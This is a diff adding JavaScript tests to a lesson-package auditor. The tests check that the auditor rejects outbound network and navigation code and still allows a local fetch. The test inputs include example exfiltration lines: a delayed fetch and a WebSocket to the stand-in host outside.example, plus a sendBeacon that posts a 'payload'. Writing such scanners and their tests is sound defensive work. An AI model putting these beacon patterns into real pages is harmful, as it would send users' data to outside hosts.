@@ -116,3 +116,36 @@ test('rejects credential strings in otherwise allowed evidence CSV', () => fixtu
   assert.throws(() => auditPublicPackage(root, ['evidence/demo/content/results.csv']),
     /Potential secret or teacher-only material/);
 }));
+
+
+test('rejects delayed external endpoints and active navigation in lesson scripts', () => fixture(({root,write}) => {
+  for (const code of [
+    "setTimeout(() => fetch('https://outside.example/collect'), 1000);",
+    "const destination = 'https://outside.example/';",
+    "new XMLHttpRequest();",
+    "navigator.sendBeacon('/collect', 'payload');",
+    "window.open('/index.html');",
+    "location.assign('/index.html');",
+    "const socket = new WebSocket('//outside.example/live');"
+  ]) {
+    write('lessons/demo/player.js', code);
+    assert.throws(() => auditPublicPackage(root, ['lessons/demo/player.js']),
+      /Unsafe outbound network or navigation code/, code);
+  }
+}));
+test('rejects active network and navigation primitives in inline lesson HTML', () => fixture(({root,write}) => {
+  for (const html of [
+    '<script>new XMLHttpRequest();</script>',
+    '<script>navigator.sendBeacon("/collect", "data");</script>',
+    '<script>window.open("/index.html");</script>'
+  ]) {
+    write('lessons/demo/index.html', html);
+    assert.throws(() => auditPublicPackage(root, ['lessons/demo/index.html']),
+      /Unsafe outbound network or navigation code/, html);
+  }
+}));
+test('allows local manifest-resolvable fetch and student progress persistence', () => fixture(({root,write}) => {
+  write('lessons/demo/player.mjs',
+    "const response = await fetch('./lesson.json'); localStorage.setItem('progress', '1');");
+  assert.equal(auditPublicPackage(root, ['lessons/demo/player.mjs']).auditedFiles, 1);
+}));
